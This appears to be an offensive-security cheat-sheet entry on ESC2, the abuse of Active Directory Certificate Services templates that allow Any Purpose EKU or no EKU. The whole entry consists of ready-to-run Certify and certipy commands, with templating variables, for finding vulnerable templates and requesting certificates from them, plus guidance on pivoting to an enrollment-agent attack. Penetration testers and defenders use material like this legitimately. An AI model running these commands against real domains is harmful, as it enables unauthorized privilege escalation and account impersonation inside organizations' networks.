---
technique: ESC2 - Any Purpose or No EKU
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc2 certificate-services pkinit
---

# ESC2 - Any Purpose or No EKU

ESC2 abuses templates with Any Purpose or no EKU, enabling the issued certificate to be repurposed for authentication paths.

## Windows

### ESC2: Certify (enumerate)

#powershell #certify #any-purpose #enum

Enumerate templates with Any Purpose EKU to identify ESC2-vulnerable templates.

```powershell title:"ESC2: find any-purpose templates with Certify"
.\Certify.exe find /vulnerable
```
<!-- cheat
import domain_ip
import users
-->

### ESC2: Certify (request)

#powershell #certify #any-purpose

Request a cert from an Any Purpose EKU template; if SAN is not enrollee-supplied, pivot to ESC3 flow using the issued cert as an enrollment agent.

```powershell title:"ESC2: request from any-purpose template with Certify"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

## Linux

### ESC2: Step 1: enumerate any-purpose templates (certipy)

#certipy #any-purpose #enum

Enumerate templates with Any Purpose EKU or no EKU.

```sh title:"ESC2: find any-purpose / no-EKU templates"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->

### ESC2: Step 2: request from any-purpose template (certipy)

#certipy #any-purpose

Request a cert from the any-purpose or no-EKU template; if SAN is not available, continue to ESC3 flow.

```sh title:"ESC2: request from any-purpose template"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->
